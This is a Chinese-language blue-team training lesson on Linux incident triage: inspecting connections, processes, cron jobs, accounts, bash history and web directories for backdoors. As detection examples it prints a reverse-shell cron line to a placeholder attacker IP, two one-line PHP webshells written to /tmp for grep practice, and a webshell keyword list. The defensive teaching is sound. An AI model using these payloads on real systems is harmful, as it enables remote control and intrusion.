---
day: 24
title: Linux应急排查
phase: 第一阶段
difficulty: ⭐⭐ 基础
---

# Day 24：Linux应急排查

> **阶段**：第一阶段 · 蓝队极速上岗 | **难度**：⭐⭐ 基础 | **课时**：2-3小时

---

## 📋 今日学习目标

1. 掌握Linux系统的5项核心应急排查动作
2. 能排查异常进程和端口
3. 能检查定时任务和异常用户
4. 能通过history命令分析攻击者操作
5. 能在模拟环境中独立完成Linux应急排查

---

## 📖 核心知识讲解

### 一、Linux应急排查总览

与Windows类似，Linux排查也有标准顺序：

```
排查顺序：
① 网络连接 → 有没有可疑外连？（ss/netstat）
② 进程列表 → 有没有陌生进程？（ps aux）
③ 定时任务 → 有没有后门cron？（crontab -l + /etc/cron*）
④ 用户账户 → 有没有新创建的用户？（/etc/passwd）
⑤ 历史命令 → 攻击者执行了什么？（history / .bash_history）
⑥ 敏感文件 → 有没有webshell/后门脚本？（find）
⑦ 日志溯源 → 从日志反推攻击过程？（Day 10技能）
```

### 二、五项核心排查动作

#### 动作1：排查网络连接 —— "机器在和谁聊天？"

```bash
# 查看所有网络连接（推荐ss，更快）
ss -tunap

# 传统netstat
netstat -antup

# 输出解读：
# LISTEN     → 正在监听（等待别人连接）
# ESTABLISHED → 已建立连接（正在通信中）⚠️ 重点关注
# TIME_WAIT  → 连接已关闭，等待清理

# 只看已建立的连接
ss -tnp | grep ESTAB

# 查找可疑外连的特征：
# - 目的IP是境外陌生IP
# - 目的端口是非标准端口（非22/80/443）
# - 进程是php/nginx/tomcat等Web进程（Webshell后门特征！）
```

**可疑外连特征：**
```
Web服务器(nginx) → 外连境外IP:4444 🔴 极可疑！典型的反弹shell
普通用户进程(bash) → 外连随机IP:8080 🟡 可疑
php-fpm → 外连陌生IP:9999 🔴 Webshell通信特征
sshd → 外连多个IP的22端口 🟡 可能是跳板攻击
```

#### 动作2：排查进程 —— "混进了什么坏人？"

```bash
# 查看所有进程（最常用）
ps aux

# 按CPU使用率排序
ps aux --sort=-%cpu | head -20

# 按内存使用率排序
ps aux --sort=-%mem | head -20

# 查看进程树（父子关系更清楚）
ps auxf

# 查看隐藏进程（比较proc目录和ps输出）
ls /proc | grep -E '^[0-9]+$' > /tmp/proc_list.txt
ps aux | awk '{print $2}' > /tmp/ps_list.txt
diff /tmp/proc_list.txt /tmp/ps_list.txt
# 有差异 → 存在隐藏进程！可能是rootkit
```

**可疑进程特征：**
- 进程名是随机字符串（如`dkfj23`、`tmp1234`）
- 进程运行路径在`/tmp`或`/var/tmp`下
- 进程名伪装成系统进程但路径不对（如`nginx`从`/tmp/nginx`启动）
- CPU/内存使用异常高（可能是挖矿程序）
- COMMAND列包含`./`开头（当前目录执行，可疑）

#### 动作3：排查定时任务 —— "有没有定时炸弹？"

```bash
# 检查当前用户的定时任务
crontab -l

# 检查所有用户的定时任务
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done

# 检查系统级定时任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# 检查anacron任务（关机后补执行的）
cat /etc/anacrontab

# 检查cron日志
grep "CMD" /var/log/cron | tail -50
```

**可疑定时任务特征：**
- 每分钟执行一次（`* * * * *`）且执行的是/tmp下的脚本
- 执行的命令是反弹shell：
  ```
  */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/攻击IP/4444 0>&1'
  ```
- 执行的脚本是将自身添加到启动中

#### 动作4：排查用户与权限 —— "谁被偷偷加了进来？"

```bash
# 查看所有用户
cat /etc/passwd

# 查看有登录权限的用户（非nologin）
cat /etc/passwd | grep -v nologin | grep -v false

# 查看最近创建的用户（passwd文件按修改时间排序）
ls -lt /etc/passwd /etc/shadow /etc/group

# 查看UID为0的用户（只有root应该是0，多了就是后门）
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 查看sudo权限
cat /etc/sudoers
grep -v '^#' /etc/sudoers | grep -v '^$'

# 查看当前登录用户
w
who
last | head -20       # 最近登录记录
lastlog               # 所有用户最近登录时间
```

**可疑用户特征：**
- UID=0但不叫root（后门管理员）
- 新建不久的莫名账户
- 账户有登录shell（/bin/bash）但你完全不认识

#### 动作5：排查历史命令与敏感文件 —— "攻击者做了什么？"

```bash
# 查看root的历史命令
cat /root/.bash_history | tail -100

# 查看所有用户的历史命令
cat /home/*/.bash_history 2>/dev/null

# 重点关注这些命令：
# wget/curl → 下载恶意文件
# chmod +x → 给后门加执行权限
# ./ 开头 → 执行当前目录文件
# iptables → 修改防火墙规则
# useradd → 创建后门账号
# crontab → 添加定时任务
# rm -rf → 删除日志/证据
# history -c → 清除历史命令（攻击者清除痕迹）

# 查找最近修改的文件（关注/tmp、/var/tmp、/dev/shm）
find /tmp -type f -mtime -1 -ls      # 最近1天修改的/tmp文件
find /var/tmp -type f -mtime -1 -ls
find /dev/shm -type f -ls             # 共享内存中的文件（常被利用）

# 查找Web目录下的可疑脚本
find /var/www -name "*.php" -mtime -7 -ls  # 最近7天的php文件
find /var/www -type f -name "*.php" -exec grep -l "eval\|base64_decode\|system\|exec" {} \;
# 查找含eval/base64_decode/system的php文件（常见webshell关键词）
```

### 三、应急排查一键脚本

```bash
#!/bin/bash
# Linux应急排查一键脚本
echo "===== 1. 系统信息 ====="
uname -a && uptime && whoami

echo "===== 2. 网络连接（ESTABLISHED）====="
ss -tnp | grep ESTAB

echo "===== 3. CPU最高的10个进程 ====="
ps aux --sort=-%cpu | head -10

echo "===== 4. 当前用户定时任务 ====="
crontab -l 2>/dev/null || echo "无"

echo "===== 5. 所有有登录权限的用户 ====="
grep -v '/nologin\|/false' /etc/passwd

echo "===== 6. UID=0的用户（应有且仅有root）====="
awk -F: '($3==0){print $1}' /etc/passwd

echo "===== 7. 最近10次登录 ====="
last | head -10

echo "===== 8. /tmp目录最近修改的文件 ====="
find /tmp -type f -mtime -1 -ls 2>/dev/null

echo "===== 9. 最近修改的cron任务 ====="
grep "CMD" /var/log/cron 2>/dev/null | tail -20

echo "===== 10. Web目录可疑php文件 ====="
find /var/www -name "*.php" -mtime -7 -ls 2>/dev/null
```

---

## 🔧 实操任务

### 任务1：在Kali中练习排查命令（20分钟）

在Kali Linux虚拟机中执行上述所有排查命令，观察你系统的正常状态是什么样的：

```bash
# 一个一个敲，看看正常系统长什么样
ss -tunap
ps aux --sort=-%cpu | head -10
crontab -l
awk -F: '($3==0){print $1}' /etc/passwd
last | head -10
```

### 任务2：模拟应急排查（15分钟）

模拟以下场景：有人报告说Kali Linux虚拟机"运行变慢了"。请执行应急排查，检查是否存在以下问题：
- 有没有异常进程占用大量CPU？
- 有没有异常外连？
- 有没有可疑定时任务？
- /tmp下有没有可疑文件？

### 任务3：webshell检测练习（10分钟）

```bash
# 在/tmp下创建几个"可疑"文件进行模拟
echo '<?php @eval($_POST[cmd]);?>' > /tmp/test1.php
echo '<?php system($_GET[c]);?>' > /tmp/test2.php
echo 'hello world' > /tmp/normal.txt

# 用grep扫描
grep -rl "eval\|base64_decode\|system\|exec" /tmp/*.php 2>/dev/null
# 观察哪些文件被检出
```

---

## ✅ 验收标准

- [ ] 能独立完成Linux系统的5项核心排查
- [ ] 能通过ss/ps识别可疑连接和进程
- [ ] 能检查cron是否存在恶意定时任务
- [ ] 能检查/etc/passwd发现后门账号
- [ ] 能用grep扫描webshell特征
- [ ] 有自己的Linux应急排查命令速查表

---

## 📝 今日小结

Linux应急排查和Windows的逻辑一样，只是工具变成了Linux命令。看完今天的排查清单你会发现，基本上就是Day 4-5学的那些基础命令在安全场景下的组合应用。记住排查顺序：先看网络连接→再看进程→然后查持久化（cron/用户）→最后查文件。熟练了这些，遇到Linux被入侵不会再手足无措。

**记住今天的核心**：
- `ss -tnp` = 看网络连接，ESTABLISHED是重点
- `ps aux` = 看进程，路径异常/CPU异常是关键
- `crontab -l` = 看定时任务，每分钟执行的最可疑
- `awk -F: '($3==0)' /etc/passwd` = 看有没有隐藏的超级用户
- `/tmp` 下的文件 = 高度可疑

---

## 📚 延伸阅读（可选）

- 了解chkrootkit和rkhunter：Linux专用的rootkit检测工具
- 了解OSSEC：开源的主机入侵检测系统（HIDS）

---

## 🎯 高频面试题

**Q1：Linux应急排查的5个核心检查点是什么？**

> 1. **进程**：`ps aux` 看所有进程 / `ps aux --sort=-%cpu` 按CPU排序 / `ps aux | grep -v "\[" ` 排除内核线程
> 2. **网络**：`ss -tunap` 看所有连接和对应进程 / `ss -tunap | grep ESTAB` 只看活跃连接
> 3. **用户**：`last -20` 最近登录 / `w` 当前登录 / `cat /etc/passwd | grep -v nologin` 看可登录账户
> 4. **启动项**：`crontab -l` 用户定时任务 / `cat /etc/crontab` 系统定时任务 / `systemctl list-units --state=running`
> 5. **文件**：`find / -mtime -1 -type f` 最近24小时修改的文件 / `find /tmp -type f` 临时目录文件

**Q2：怎么快速判断Linux服务器有没有被植入后门？**

> 三步快速检查：
> ```
> 1. 看进程：ps aux → 有没有名字随机的进程、CPU异常的进程
> 2. 看外连：ss -tunap → 有没有连到可疑IP的进程
> 3. 看定时任务：crontab -l、cat /etc/cron* → 有没有wget/curl下载执行的定时任务
> ```
> 这三步能在5分钟内覆盖80%的Linux后门场景。

**Q3：bash_history在应急排查中的价值？**

> 攻击者登录后的每一条命令都会记录在 ~/.bash_history 中（除非攻击者清除了）。这是重建攻击时间线的关键信息源：
> ```
> cat /home/被入侵用户/.bash_history
> 能看出攻击者：wget了什么、解压了什么、执行了什么脚本、创建了什么后门
> ```
> ⚠️ 注意：攻击者通常会执行 `history -c` 清除历史，或 `unset HISTFILE` 禁止记录。但如果攻击者忘了——这就是你的金矿。

---

## 💻 Linux应急实操检查脚本

```bash
#!/bin/bash
echo "=== 应急排查快速脚本 ==="
echo "--- 当前登录用户 ---"
w
echo "--- 最近登录 ---"
last -20
echo "--- 可疑进程（按CPU排序TOP10）---"
ps aux --sort=-%cpu | head -11
echo "--- 所有监听端口 ---"
ss -tlnp
echo "--- 活跃外连 ---"
ss -tunap | grep ESTAB
echo "--- 定时任务 ---"
crontab -l 2>/dev/null
ls /etc/cron.* 2>/dev/null
echo "--- 最近修改的文件 ---"
find / -mtime -1 -type f 2>/dev/null | head -20
echo "--- 检查完毕 ---"
```

---

## 📖 深度补充内容

### 面试高频题

## 💡 面试高频题：Linux应急排查

**Q: Linux应急排查的核心排查清单是什么？**
A: ①用户排查：`cat /etc/passwd | grep -v nologin`（查看可登录用户）→ `cat /etc/shadow`（查看密码哈希是否被修改）→ `cat ~/.ssh/authorized_keys`（查看是否被添加SSH公钥后门）；②进程排查：`ps auxf`（进程树）→ `ls -la /proc/PID/exe`（查看进程对应的可执行文件路径）→ 可疑特征：进程名带括号/点号、CPU持续100%、启动时间异常；③网络排查：`netstat -antp` / `ss -antp` → 查看异常外连（境外IP、非标准端口、非法进程发起）；④计划任务：`crontab -l`（当前用户）、`cat /etc/crontab`（系统级）、`ls /var/spool/cron/`（所有用户）→ 检查是否有非授权的定时任务；⑤文件排查：`find / -mtime -1 -type f 2>/dev/null`（24小时内修改的文件）→ `find / -perm -4000 -type f 2>/dev/null`（SUID文件，提权利用）。

**Q: Linux被入侵后，攻击者最常留下的后门有哪些？**
A: ①SSH公钥后门：在~/.ssh/authorized_keys中添加攻击者的公钥→永久免密登录；②计划任务后门：添加定时执行的恶意脚本→维持持久化；③SUID后门：给/bin/bash或自定义程序设置SUID位→普通用户提权root；④LD_PRELOAD后门：修改/etc/ld.so.preload注入恶意共享库→劫持系统调用；⑤内核模块rootkit：加载恶意内核模块（LKM）→隐藏进程/文件/网络连接。排查时特别注意：`netstat`看不到但`lsof`看得到的网络连接=内核级rootkit。

**Q: 如何用Linux日志做攻击溯源？**
A: ①/var/log/secure：追踪攻击者如何登录的（SSH? 弱口令? 密钥?）、从哪个IP来的、登录后做了什么sudo操作；②~/.bash_history：查看攻击者执行了哪些命令——但攻击者通常会清除此文件，所以不能全靠这个；③/var/log/audit/audit.log（auditd审计日志）：记录了所有系统调用和文件操作——攻击者很难全部清除，是最可靠的追溯依据；④/var/log/messages或syslog：查看系统级事件。溯源方法：先锁定攻击者的登录IP和时间→从登录时间点开始，按时间线逐一追踪其操作。


---

## 🎯 实战思维训练

### 蓝队"条件反射"训练

网络安全值守中，很多判断需要在几秒内完成。以下是本日主题相关的"条件反射"训练：

**看到以下现象 → 立即联想到 → 采取动作**：

1. 短时间内同一IP大量不同URL请求 → 目录/漏洞扫描 → 检查是否返回了不该返回的内容
2. WAF告警+同IP的Web日志中有500错误 → 攻击可能在尝试绕过WAF → 查看完整请求体
3. 非工作时间的管理员登录 → 凭据泄露/后门 → 确认是否为合法运维操作
4. 同一文件被频繁POST请求 → Webshell心跳 → 检查文件内容和创建时间
5. 出站流量突增到非标准端口 → 数据渗出/C2通信 → 追踪目标IP并阻断

### "如果是你，你怎么防？"

假设你是护网蓝队负责人，面对今天学习的安全威胁，请设计你的防御方案：
- 预防层：如何在攻击发生前阻止？（安全配置/代码审计/权限控制）
- 检测层：攻击发生时如何发现？（日志/告警/流量分析的关键特征）
- 响应层：确认攻击后如何处置？（隔离/封禁/取证/恢复的标准动作）
- 复盘层：事后如何防止再次发生？（规则优化/流程改进/培训加固）

---

## 📈 学习效果自检

请回答以下问题，不看笔记：

1. 能不能用3句话向一个非安全同事解释今天学的核心概念？
2. 能不能在白板上画出今天涉及的关键流程/架构？
3. 能不能写出至少3条针对今天主题的检测规则/命令？
4. 如果面试官问"你遇到过XX问题吗？怎么处理的？"你能给出有细节的回答吗？
5. 今天的实操任务中，有没有遇到卡住的地方？记录到笔记中，明天优先解决。

> **记不住？** 正常的。安全知识不是"看一遍就记住"的——是需要"反复遇到、反复使用、反复验证"之后才内化的。重要的是**坚持每天动手**，让大脑建立"安全思维"的神经通路。

---

## 🔗 知识链接

将今天的内容与之前学过的知识建立连接：
- 今天的知识点在Kill Chain的哪个阶段？在ATT&CK中对应哪些技术？
- 今天的检测方法依赖之前学过的哪些工具？（Wireshark/grep/awk/Nmap...）
- 如果用今天学的知识去看Day 1的护网场景，你能额外发现什么问题？

建立知识之间的链接是"从入门到精通"的关键——孤立的知识点容易遗忘，相互连接的知识形成网络后就会变得牢固。


---

## 🔬 进阶专题：本日知识在真实护网中的应用

### 护网场景还原

想象你正在护网值守中，突然收到一条与本日主题相关的告警。以下是标准的思维和处理流程：

**1. 第一反应（0-30秒）**：确认告警来源设备是否正常 → 查看告警级别 → 判断是否为"狼来了"

**2. 快速研判（30秒-2分钟）**：提取关键信息（源IP/目标资产/攻击类型/时间）→ 查威胁情报 → 看同一IP的其他告警

**3. 深度分析（2-10分钟）**：回放原始流量/日志 → 还原攻击payload → 判断攻击是否成功

**4. 处置决策（10-15分钟）**：确认是攻击→定级→封IP/隔离/升级事件；确认是误报→标记→优化规则

**5. 记录闭环（15-20分钟）**：填写工单（研判依据+处置动作+证据截图）→ 标记闭环


### 高手与新手的关键区别

| 维度 | 新手 | 高手 |
| --- | --- | --- |
| 看告警 | 只看这一条告警的内容 | 同时关联其他设备/其他时间的同类告警 |
| 判断依据 | "这个payload看起来像攻击" | "这个payload+这个User-Agent+这个时间点+这个频率=SQLMap自动化扫描" |
| 处置方式 | 封IP→完事 | 封IP+排查漏洞+检查是否已有数据泄露+通知业务方+更新WAF规则 |
| 记录质量 | "已处置" | "10:05收到WAF SQL注入告警→核查源IP 45.x为境外IP+威胁情报标记恶意→查看该IP完整请求链→确认SQLMap自动化扫描→已在WAF永久封禁+通知开发修复参数化查询→附件：攻击流量pcap+威胁情报截图" |

### 你今天学的知识在ATT&CK中的映射

花5分钟思考以下问题（有助于建立安全思维框架）：

- 今天的攻击手法在ATT&CK中属于哪个战术？对应的技术编号是什么？

- 用Kill Chain模型分析：这种攻击通常发生在哪几个阶段？

- 你的检测手段应该部署在Kill Chain的哪一环？为什么？

- 如果你负责设计针对这种攻击的防御方案，你会从哪几个层面入手？


> **记住**：蓝队不是"见招拆招"的被动防守，而是"知己知彼"的主动防御。每天学完一个知识点后，立刻思考"如果我是攻击者我会怎么用"+"如果我是防御者我该怎么挡"——这种双向思维是蓝队核心竞争力的来源。

---

## 📓 学习笔记模板

建议用以下模板整理今天的学习笔记，放入个人知识库：

```
【知识卡片：本日主题】
日期：2026-06-XX
核心概念（一句话）：
关键原理（3-5点）：
1.
2.
3.
检测方法（命令/规则）：
常见误报与排查：
实际案例简述：
面试题准备（3道）：
关联知识（链接到其他知识卡片）：
未解决的问题（明天继续研究）：
```

> **知识管理的黄金法则**：不是你存了多少，而是你能随时调用多少。每周花1小时整理和回顾笔记，比你再看一遍原始资料更有效。

---

## 🎯 今日学习里程碑检查

**知识掌握度自评（1-5分）**：
- 我能不看笔记讲清楚今天核心概念的原理：___分
- 我能写出今天学到的至少3条检测规则/命令：___分
- 我能解决今天实操任务中的所有问题：___分
- 我能在面试中流畅回答今天主题相关的问题：___分

**如果任何一项低于3分**，请标记为"需复习"，明天开始前花10分钟回顾。

**知识串联检查**：
- 今天的内容在Kill Chain中对应哪个阶段？
- 用ATT&CK框架看，今天的技术属于哪个战术？
- 今天学到的检测方法与之前学过的哪些工具（Wireshark/grep/Nmap/ELK）可以结合使用？

> **学以致用**：最好的学习方法就是"教"。试着用最简单的语言向一个非安全背景的朋友解释你今天学到的核心概念——如果你能让对方听懂，说明你真正掌握了。
